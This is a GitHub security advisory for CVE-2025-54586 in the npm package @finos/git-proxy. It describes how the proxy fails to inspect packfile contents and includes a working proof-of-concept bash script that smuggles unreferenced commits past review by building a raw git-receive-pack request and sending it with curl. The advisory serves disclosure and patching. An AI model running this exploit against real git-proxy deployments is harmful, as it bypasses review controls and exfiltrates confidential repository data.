# [H] GitProxy Hidden Commits Injection

## Summary
Severity: High
Advisory: GHSA-v98g-8rqx-g93g
CVE: CVE-2025-54586
CWE: CWE-200
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2025-07-30
Source: https://github.com/advisories/GHSA-v98g-8rqx-g93g
Type: github-advisory

## Affected
- npm: `@finos/git-proxy` — affected >=0 <1.19.2

## Details
### Summary
An attacker can inject extra commits into the pack sent to GitHub, commits that aren’t pointed to by any branch. Although these “hidden” commits never show up in the repository’s visible history, GitHub still serves them at their direct commit URLs. This lets an attacker exfiltrate sensitive data without ever leaving a trace in the branch view. We rate this a High‑impact vulnerability because it completely compromises repository confidentiality.

### Details

The proxy currently trusts only the ref‑update line (`oldOid → newOid`) and doesn't inspect the packfile’s contents

Because the code only runs `git rev-list oldOid..newOid` to compute **introducedCommits** but **never** checks which commits actually arrived in the pack, a malicious client can append extra commits. Those “hidden” commits won’t be pointed to by any branch but GitHub still stores and serves them by SHA. 
<img width="2556" height="744" alt="Screenshot 2025-07-16 at 12 29 19" src="https://github.com/user-attachments/assets/abf459a9-310b-4819-a989-797c7e871790" />

### PoC

#### Prerequisites

-   A GitHub Personal Access Token stored in `~/.github-test-pat`.
-   A test repository also registered in git-proxy, e.g. `your-org/test-repo.git`, to which you have push rights.

#### 1. Prepare the “visible” and “hidden” commits

```bash
# Clone the test repository
git clone http://localhost:8000/your-org/test-repo.git
cd test-repo

# 1. Record the original HEAD
ORIG_COMMIT=$(git rev-parse HEAD)

# 2. Create branch 'foo' and add a visible commit
git checkout -b foo
echo "visible commit" >> file.txt
git add file.txt
git commit -m "Visible commit"
VISIBLE_COMMIT=$(git rev-parse HEAD)

# 3. Go back to the original commit and create a hidden-branch
git checkout $ORIG_COMMIT
git checkout -b hidden-branch
echo "hidden change" > hidden.txt
git add hidden.txt
git commit -m "Hidden commit"
HIDDEN_COMMIT=$(git rev-parse HEAD)

# Return to 'foo'
git checkout foo
```

#### 2. Push only the visible commit to branch `foo`

```bash
git push --set-upstream origin foo
# An authorized user approves this push via your normal review workflow
```

#### 3. Build and push a pack containing the hidden commit

Create a script named `upload-pack.sh` (replace the placeholder variables with the SHAs you recorded above):

```bash
#!/usr/bin/env bash
REMOTE_URL="http://localhost:8000/your-org/test-repo.git"
REF_NAME="refs/heads/foo"
ORIG_COMMIT="<<ORIG_COMMIT>>"
NEW_COMMIT="<<VISIBLE_COMMIT>>"
OLD_COMMIT="0000000000000000000000000000000000000000"
HIDDEN_COMMIT="<<HIDDEN_COMMIT>>"

# 1. List all objects for the visible and hidden commits
git rev-list --objects --no-object-names "^${ORIG_COMMIT}" ${NEW_COMMIT} > objects.txt
git rev-list --objects --no-object-names "^${ORIG_COMMIT}" ${HIDDEN_COMMIT} >> objects.txt

# 2. Pack them into a single packfile
cat objects.txt
git pack-objects --stdout < objects.txt > packfile

# 3. Construct the Git smart‑protocol update header
printf "${OLD_COMMIT} ${NEW_COMMIT} ${REF_NAME}\0 report-status-v2 side-band-64k object-format=sha1 agent=git/2.39.5" > update_line
UPDATE_LINE_LEN="$(wc -c < update_line)"

printf "%04x" $((UPDATE_LINE_LEN + 4)) > output
cat update_line >> output

# Git smart protocol expects a flush packet
PKT_FLUSH="0000"
printf "%s" "${PKT_FLUSH}" >> output

# Append the packfile
cat packfile >> output

# 4. Send the malicious push via curl
curl -u ${USER}:"$(<~/.github-test-pat)" \
  -X POST "${REMOTE_URL}/git-receive-pack" \
  -H "Content-Type: application/x-git-receive-pack-request" \
  -H "Accept: application/x-git-receive-pack-result" \
  --user-agent "git/2.42.0" \
  --data-binary @output | cat -v
```

Make it executable:

```bash
chmod +x upload-pack.sh
```

Run it:

```bash
./upload-pack.sh
```

#### 4. Verify the hidden commit

Open in your browser (or via `curl`):

```
https://github.com/your-org/test-repo/commit/<<HIDDEN_COMMIT>>
```

You will see the **“Hidden commit”**, even though it is not referenced by any branch.

### Impact
- **Data Exfiltration (Confidentiality breach):**  
  Attackers can inject secrets, credentials, or proprietary data into any repository they push to via git-proxy.

- **Undetectable in UI:**  
  Since the hidden commits never appear in branch graphs, standard code review will not surface them.

- **Persistence Window:**  
  GitHub retains unreferenced objects for a period long enough to allow automated retrieval before garbage‑collecting them.

## References
- https://github.com/finos/git-proxy/security/advisories/GHSA-v98g-8rqx-g93g
- https://nvd.nist.gov/vuln/detail/CVE-2025-54586
- https://github.com/finos/git-proxy/commit/9c1449f4ec37d2d1f3edf4328bc3757e8dba2110
- https://github.com/finos/git-proxy/commit/a620a2f33c39c78e01783a274580bf822af3cc3a
- https://github.com/finos/git-proxy
- https://github.com/finos/git-proxy/releases/tag/v1.19.2
